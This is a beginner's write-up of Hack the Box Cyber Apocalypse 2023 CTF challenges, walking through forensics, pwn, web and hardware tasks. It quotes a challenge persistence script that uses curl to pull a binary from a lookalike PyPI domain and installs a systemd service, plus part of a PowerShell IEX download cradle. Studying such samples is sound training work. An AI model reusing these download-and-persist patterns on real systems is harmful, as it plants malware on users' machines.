---
title: Hack the Box Cyber Apocalypse CTF 2023
date: 2023-03-23 
categories: [ctf, writeup, htb, jeopardy]
tags: [forensics, hardware, misc, pwn, web, warmup, python, curl]
---

# Hack the Box Cyber Apocalypse 2023 Complete! (≧∇≦)ﾉ

Cyber Apocalypse 2023 was a jeopardy style CTF spanning multiple categories such as: forensics, hardware, pwn, misc, web, machine learning, blockchain and cryptography.

This is my first CTF that I have entered though I continue to complete rooms on TryHackMe, using the HTB Academy and working through the PicoCTF Gym.
I've come to understand during this short experience - there's nothing quite like a live CTF. I hope to continue doing CTFs in future, at least, as much as time allows.


## Warmup

-------------------------

This was a fun little flag to be had after joining the Hack the Box discord. It was hiding in the announcements section as:

``` text
HTB{l3t_th3_tr3asur3_hunt1ng_b3g1n!}
```

## Trapped Source (Web) [Very Easy]
--------------------

This was a pretty straightforward and these were the steps I took for this challenge:

- Viewed the page source (Ctrl + U or Right-Click + View Page Source)
- Scanned the page for any mention of the HTB flag format HTB{...}
- No flag text present, so I checked for any scripts available
- Found a script named "correctPin" and tried the code "8291"
- Got the flag! 


``` text
HTB{V13w_50urc3_c4n_b3_u53ful!!!}
```


## Persistence (Misc) [Very Easy]
-------------------

First, I'll say, what a fitting name for this challenge 🤣

At the moment I don't know much about web-based challenges and incorrectly approached this at first. I read the question carefully and soon realised that the page needed to be accessed many, *MANY*  times (around 1000 as per the description).

There may be many ways to approach this, but I used what I knew, which was the handy tool called **cURL**.

At first, I tried to simply use the given url with curl, like so:

``` bash
$ curl ip-address:port/flag
```

And received a garbled string as a result. I knew that it was working, but it wouldn't do to simply repeat this request. So I looked up how to replicate the result continuously.

``` bash
$ while true; do curl ip-address:port/flag; done 
```

Great! This was working as well, but I needed to save the output somewhere:

``` bash
$ while true; do curl --output >(cat >> filename) ip-address:port/flag; done 
```

And after some long time later, a flag appears!
We can view it like so, piping it to grep:

``` bash
$ cat filename | grep "HTB{"
```

Getting the following output:
``` text
HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}
```

## Plaintext Tleasure (Forensics) [Very Easy]
------------------------------------------------------

This challenge had to be downloaded and contained a zip file, which can easily opened with the following command:

``` bash
$ unzip filename.zip
```

The extract file is named "capture.pcap". which I confirm with the *file* command.
Before searching through the file in its entirety, I decide to try basic commands and see if the flag can be found this way and this is the line which worked:

``` bash
$ strings capture.pcap | grep "HTB{"
```

We get the flag:

``` text
HTB{th3s3_4l13ns_st1ll_us3_HTTP}
```

## Alien Cradle (Forensics) [Very Easy]
----------------------------------------------------------

We are provided with a zipped folder containing a Powershell script. I confirm the contents:

``` shell
$ file cradle.ps1 

# cradle.ps1: ASCII text, with very long lines (618), with no line terminators
```

Knowing that a lot of text exists within this file, I consider the following command:

``` bash
$ strings cradle.ps1

# [top portion redacted for warnings]...'{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

The flag is hiding within the post, separated in such a manner that the usual 'trick' of "HTB{" won't suffice here, so it was a good choice to check the contents with *strings*  first.

There probably is a more efficient way to extract the flag from this text, but for now, I simply copied the relevant ouput and cleaned it up as per the flag ruling:

``` text
HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}
```

## Extraterrestrial Persistence (Forensics) [Very Easy]
-------------------------------------

This challenge was provided as a downloadable zip file, which upon extraction reveals a shell script file. I confirm this as usual:

``` bash
$ file persistence.sh

# persistence.sh: ASCII text, with very long lines (396), with CRLF line terminators
```

Although the file provided is not executable, being a shell script, I opted to view the file contents first:

``` bash
$ cat persistence.sh

# n=`whoami`
# h=`hostname`
# path='/usr/local/bin/service'
# if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

# curl https://files.pypi-install.com/packeges/service -o $path

# chmod +x $path

# echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service
```

Interesting, not only do we learn a bit of shell script commands, we get an idea of the persistence mechanism the aliens have created (lore information for the CTF, but also knowledge in general). 

The Base64 string seems promising, so I focus my attention there instead.
There are many sites to decode base64 online, but knowing how to achieve the same result from terminal is ideal for learning. 

The output is sent to the terminal via echo and then piped into the base64 utility with the -d tack for the decode option:

``` bash
echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==" | base64 -d
```


We are then presented with the following decoded output, with our hiding in the Description portion:
``` text
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target
```

Flag:
``` text
HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
```

## Initialise Connection (Pwn) [Very Easy]
-----------------------------

We are informed to connect to the challenge with netcat in the following manner:

``` bash
$ nc ip-address port

▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
▣                            
▣  Enter 1 to get the flag!  
▣                            
▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣

```
Then send the number 1 in order to get the flag. 

``` bash
>> 1
HTB{g3t_r34dy_f0r_s0m3_pwn}
```

A very easy challenge which also teaches a bit on using nc.

## Questionnaire (Pwn) [Very Easy]
--------------------------------

As the previous challenge has taught, this is provided as a Docker instance which we connect to like so:

``` bash
nc ip-address port
```

Which provides an interesting questionnaire, educating about c/c++/ELF files in Linux. A downloadable zip archive is provided to help find the flag we well. 

Most of the answers can be found by reading the text provided, but those which require extras steps will be detailed accordingly.

``` text
[*] Question number 0x1:                                                                     
                                                                                             
Is this a '32-bit' or '64-bit' ELF? (e.g. 1337-bit)                                          
                                                                                             
>>  64-bit


[*] Question number 0x2:                                                                     
                                                                                             
What's the linking of the binary? (e.g. static, dynamic)                                     
                                                                                             
>>  dynamic


[*] Question number 0x3:                                                                     
                                                                                             
Is the binary 'stripped' or 'not stripped'?                                                  
                                                                                             
>>  not stripped


[*] Question number 0x4:                                                                     
                                                                                             
Which protections are enabled (Canary, NX, PIE, Fortify)?                                    
                                                                                             
>>  NX


[*] Question number 0x5:                                                                     
                                                                                             
What is the name of the custom function that gets called inside `main()`? (e.g. vulnerable_function())                                                                                    
                                                                                             
>>  vuln()


0x6:                                                                     
                                                                                             
What is the size of the 'buffer' (in hex or decimal)?                                        
                                                                                             
>> 
```


For this question, we'll have to examine the provided file, "test.c". We output the code:


``` bash
$ cat test.c

#include <stdio.h>
#include <stdlib.h>

/*
This is not the challenge, just a template to answer the questions.
To get the flag, answer the questions. 
There is no bug in the questionnaire.
*/

void gg(){
        system("cat flag.txt");
}

void vuln(){
        char buffer[0x20] = {0};
        fprintf(stdout, "\nEnter payload here: ");
        fgets(buffer, 0x100, stdin);
}

void main(){
        vuln();
}
```

We see the line denoting the size of the buffer and add it to the questionnaire accodingly:

``` bash
[*] Question number 0x6:                                                                     
                                                                                             
What is the size of the 'buffer' (in hex or decimal)?                                        
                                                                                             
>> 0x20
```

We revert back the the questionnaire text in the terminal for the following questions:

``` text
[*] Question number 0x7:                                                                     
                                                                                             
Which custom function is never called? (e.g. vuln())                                         
                                                                                             
>>   gg()


[*] Question number 0x8:                                                                     
                                                                                             
What is the name of the standard function that could trigger a Buffer Overflow? (e.g. fprintf())                                                                                          
                                                                                             
>>  fgets

```

The next question needs us to run the provided program, which can be done with the following command:

``` bash
./test 
```

Following the steps accoding the question, we get:

``` text
[*] Question number 0x9:                                                                     
                                                                                             
Insert 30, then 39, then 40 'A's in the program and see the output.                          
                                                                                             
After how many bytes a Segmentation Fault occurs (in hex or decimal)?                        
                                                                                             
>>   40
```

The final question is not provided within the questionnaire text, or via the "test.c" program itself. Instead the use of a very useful command:

``` bash
readelf -a test
```

Readelf is a command which provides more information on ELF files, the -a tack is all results and finally, we have to add our file name.

Final answer for the questionnaire:

``` text
[*] Question number 0xa:                                                                     
                                                                                             
What is the address of 'gg()' in hex? (e.g. 0x401337)                                        
                                                                                             
>> 0x401176 
```

We finally get the flag!

``` text
HTB{th30ry_bef0r3_4cti0n}
```

It should be noted that the information provided in the questionnaire could also be found with the following command in order to answer the questions:

``` bash
$ file test

test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, for GNU/Linux 3.2.0, not stripped
```


## Getting Started (pwn) [Very Easy]
-------------------------

Assuming that the pwn challeges were completed in sequential order, then the questionnaire already provided some knowledge for the current one.
This time, we connect with nc to do the following:

``` bash
nc ip-address port
```

Seeing the following output:

``` text
Stack frame layout 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses
```

We get to learn about the stack, or in this case, how information is stored on the stack as well as creating a Buffer Overflow:

``` text

      [Addr]       |      [Value]                                                            
-------------------+-------------------                                                      
0x00007ffd2761aa70 | 0x0000000000000000 <- Start of buffer                                   
0x00007ffd2761aa78 | 0x0000000000000000                                                      
0x00007ffd2761aa80 | 0x0000000000000000                                                      
0x00007ffd2761aa88 | 0x0000000000000000                                                      
0x00007ffd2761aa90 | 0x6969696969696969 <- Dummy value for alignment                         
0x00007ffd2761aa98 | 0x00000000deadbeef <- Target to change                                  
0x00007ffd2761aaa0 | 0x000055eb89122800 <- Saved rbp                                         
0x00007ffd2761aaa8 | 0x00007f94b6eb8c87 <- Saved return address                              
0x00007ffd2761aab0 | 0x0000000000000001                                                      
0x00007ffd2761aab8 | 0x00007ffd2761ab88                                                      
                                           


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:   
                                                                                             
                                                                                             
      [Addr]       |      [Value]                                                            
-------------------+-------------------                                                      
0x00007ffeeb1994a0 | 0x0000000041414141 <- Start of buffer                                   
0x00007ffeeb1994a8 | 0x0000000000000000                                                      
0x00007ffeeb1994b0 | 0x0000000000000000                                                      
0x00007ffeeb1994b8 | 0x0000000000000000                                                      
0x00007ffeeb1994c0 | 0x6969696969696969 <- Dummy value for alignment                         
0x00007ffeeb1994c8 | 0x00000000deadbeef <- Target to change                                  
0x00007ffeeb1994d0 | 0x0000555abf8b5800 <- Saved rbp                                         
0x00007ffeeb1994d8 | 0x00007ff3ca40fc87 <- Saved return address                              
0x00007ffeeb1994e0 | 0x0000000000000001                                                      
0x00007ffeeb1994e8 | 0x00007ffeeb1995b8    


After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:                                                                                          
                                                                                             
                                                                                             
      [Addr]       |      [Value]                                                            
-------------------+-------------------                                                      
0x00007ffeeb1994a0 | 0x4242424241414141 <- Start of buffer                                   
0x00007ffeeb1994a8 | 0x0000000000000000                                                      
0x00007ffeeb1994b0 | 0x0000000000000000                                                      
0x00007ffeeb1994b8 | 0x0000000000000000                                                      
0x00007ffeeb1994c0 | 0x6969696969696969 <- Dummy value for alignment                         
0x00007ffeeb1994c8 | 0x00000000deadbeef <- Target to change                                  
0x00007ffeeb1994d0 | 0x0000555abf8b5800 <- Saved rbp                                         
0x00007ffeeb1994d8 | 0x00007ff3ca40fc87 <- Saved return address                              
0x00007ffeeb1994e0 | 0x0000000000000001                                                      
0x00007ffeeb1994e8 | 0x00007ffeeb1995b8  

```

We are then tasked to do the following:

``` text 
     ◉                                                                                       
◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉  

>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Considering how the letters filled the respective addresses above, I calculated about 44 characters to be the amount to overwrite **0xdeadbeef**.

``` text
      [Addr]       |      [Value]                                                            
-------------------+-------------------                                                      
0x00007ffd2761aa70 | 0x6161616161616161 <- Start of buffer                                   
0x00007ffd2761aa78 | 0x6161616161616161                                                      
0x00007ffd2761aa80 | 0x6161616161616161                                                      
0x00007ffd2761aa88 | 0x6161616161616161                                                      
0x00007ffd2761aa90 | 0x6161616161616161 <- Dummy value for alignment                         
0x00007ffd2761aa98 | 0x0000000061616161 <- Target to change                                  
0x00007ffd2761aaa0 | 0x000055eb89122800 <- Saved rbp                                         
0x00007ffd2761aaa8 | 0x00007f94b6eb8c87 <- Saved return address                              
0x00007ffd2761aab0 | 0x0000000000000001                                                      
0x00007ffd2761aab8 | 0x00007ffd2761ab88 
```

We get the flag:

``` text
HTB{b0f_s33m5_3z_r1ght?}
```


## Timed Transmission (Hardware) [Very Easy]
-------

We are provided with a zipped file and upon extracting it, find a file called "Captured_Signals.sal".

Briefly, looking up ".sal" gives a hint of the possible software, but let's be more certain.

``` bash
$ file Captured_Signals.sal

Captured_Signals.sal: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Extracting the file gives five .bin files and one .json file. The .sal file, bin files and json file get the cursory strings check, revealing nothing.
To confirm the software used for the .sal file, run:

``` bash
$ xxd data-0.bin

00000000: 3c53 414c 4541 453e 0100 0000 6400 0000  <SALEAE>....d...
```

Between the .sal file type, SALAE in the programme header and our previous search results - there is no doubt that this is a file for Salae's Logic 2 programme.

Proceed to download the version for your OS. On Linux we get an ".AppImage" file, which can be run like this:
(We are making it executable)

``` bash
chmod +x filename.AppImage
```

Which can then be run with:

``` bash
./filename
```

The flag in this challenge was interesting, because much like the warmup, it was hiding in plain sight. Depening on zoom magnigication, it could be missed, but finding the correct amount reveals the flag composed by the signal output itself:

``` text
HTB{b391N_tH3_HArdWAr3_QU3St}
```


## Critical Flight (Hardware) [Very Easy]
--------

This challenge also has a downloadable archive and extracting it reveals 13 files in a .gbr format.
Researching the file type shows that it is used in circuitboard design, the standard even.

The *file*  command shows that a lot of ASCII text is available, so a quick string check is done, to no result.

Let's see what other information we can get from the files:

``` bash
$ xxd HadesMicro-B_Cu.gbr  

00000000: 4730 3420 2340 2120 5446 2e47 656e 6572  G04 #@! TF.Gener
00000010: 6174 696f 6e53 6f66 7477 6172 652c 4b69  ationSoftware,Ki
00000020: 4361 642c 5063 626e 6577 2c28 362e 302e  Cad,Pcbnew,(6.0.
```

The research has paid off, let's get the KiCad software:

``` bash
$ sudo add-apt-repository ppa:kicad/kicad-7.0-releases
$ sudo apt install kicad
```

Upon installing KiCad, we are able to open the files and view the PCB designs in Gerber Viewer, being treated by the sight of the flag from the following two files:

``` text
HadesNicro-B_Cu.gbr
HadesMicro-In1_Cu.gbr
```

When pieced together, we get the flag:

``` text
HTB{533_7h3_1nn32_w02k1n95_0f_313c720n1c5#}
```


## Debug (Hardware) [Easy]
-----

This challenge also has a downloadable archive and extracting it reveals the .sal format again. Despite knowing the format, a quick scan with *file*  and  *strings* reveals no sneaky flag, so we opt to open the file in Logic 2.

A bit of reading up, helped to understand that there were specific baud rates which tended to be common, it was a matter of finding out which. As for the type, async serial seemed most appropriate.

Cycling through the various suggested baud rates:

``` text
Async Serial, RX as input and baud rate of 115200 bps
```


We eventually settle on the winning one displayed in the terminal:

``` text
WARNING: The deep space observatory is offline HTB{
INFO: Communication systems are offline reference code: 547311173_
WARNING: Unauthorized subroutines detected! reference code: n37w02k_
WARNING: The satellite dish can not sync with the swarm. reference code: c0mp20m153d}

             ______
          ,'"       "-._
        ,'              "-._ _._
        ;              __,-'/   |
       ;|           ,-' _,'"'._,.
       |:            _,'      |\ `.
       : \       _,-'         | \  `.
        \ \   ,-'             |  \   \
         \ '.         .-.     |       \
          \  \         "      |        :
           `. `.              |        |
             `. "-._          |        ;
             / |`._ `-._      L       /
            /  | \ `._   "-.___    _,'
           /   |  \_.-"-.___   """"
           \   :            /"""
            `._\_       __.'_
       __,--''_ ' "--'''' \_  `-._
 __,--'     .' /_  |   __. `-._   `-._
<            `.  `-.-''  __,-'     _,-'
 `.            `.   _,-'"      _,-'
   `.            ''"       _,-'
     `.                _,-'
       `.          _,-'
         `.   __,'"
           `'"

Starting kernel ...

Development login enabled: no
Debugging mode enabled: yes
Safe mode enabled: no

SATDish - Managment User Terminal.
Dish is offline
admin login:
```

Piecing the flag together:

``` text
HTB{547311173_n37w02k_c0mp20m153d}
```



